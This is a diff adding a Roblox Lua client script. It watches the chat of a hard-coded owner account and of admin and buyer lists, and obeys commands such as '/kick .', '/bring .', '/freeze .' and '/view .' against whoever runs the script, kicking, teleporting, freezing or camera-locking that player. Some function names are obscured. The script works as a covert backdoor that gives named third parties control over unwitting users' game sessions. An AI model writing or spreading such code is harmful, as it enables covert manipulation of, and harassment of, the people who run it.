@@ -1,0 +1,103 @@
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+local owners = {"FlipRBX3", ""}
+local admins = {}
+local buyers = {}
+local viewingOwner = nil
+function isAuthorized(player)
+
+    for _, ownerName in ipairs(owners) do
+        if player.Name == ownerName then
+            return true
+        end
+    end
+    for _, adminName in ipairs(admins) do
+        if player.Name == adminName then
+            return true
+        end
+    end
+    for _, buyerName in ipairs(buyers) do
+        if player.Name == buyerName then
+            return true
+        end
+    end
+    return false
+end
+	
+function x1y2z3(owner)
+    if owner then
+        localPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
+    end
+end
+
+function freezePlayer()
+    if not isAuthorized(localPlayer) and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        localPlayer.Character.HumanoidRootPart.Anchored = true
+    end
+end
+
+function unfreezePlayer()
+    if not isAuthorized(localPlayer) and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        localPlayer.Character.HumanoidRootPart.Anchored = false
+    end
+end
+
+function viewPlayer(owner)
+    if not isAuthorized(localPlayer) and localPlayer.Character and owner.Character then
+        viewingOwner = owner
+        localPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
+        localPlayer.CameraSubject = owner.Character.Humanoid
+    end
+end
+
+function unviewPlayer()
+    if viewingOwner then
+        localPlayer.CameraMode = Enum.CameraMode.Classic
+        localPlayer.CameraSubject = localPlayer.Character.Humanoid
+        viewingOwner = nil
+    end
+end
+
+function a1b2c3(authName)
+    local authUser
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Name == authName then
+            authUser = player
+            break
+        end
+    end
+    
+    if authUser then
+        authUser.Chatted:Connect(function(message)
+            if not isAuthorized(localPlayer) then
+                if message:sub(1, 7) == "/kick ." then
+                    local reason = message:sub(9)
+                    if reason == "" then
+                        reason = "Admins Has Kicked You."
+                    end
+                    localPlayer:Kick(reason)
+                elseif message == "/bring ." then
+                    x1y2z3(authUser)
+                elseif message == "/freeze ." then
+                    freezePlayer()
+                elseif message == "/unfreeze ." then
+                    unfreezePlayer()
+                elseif message == "/view ." then
+                    viewPlayer(authUser)
+                elseif message == "/unview ." then
+                    unviewPlayer()
+                end
+            end
+        end)
+    end
+end
+
+for _, authName in ipairs(owners) do
+    a1b2c3(authName)
+end
+for _, authName in ipairs(admins) do
+    a1b2c3(authName)
+end
+for _, authName in ipairs(buyers) do
+    a1b2c3(authName)
+end
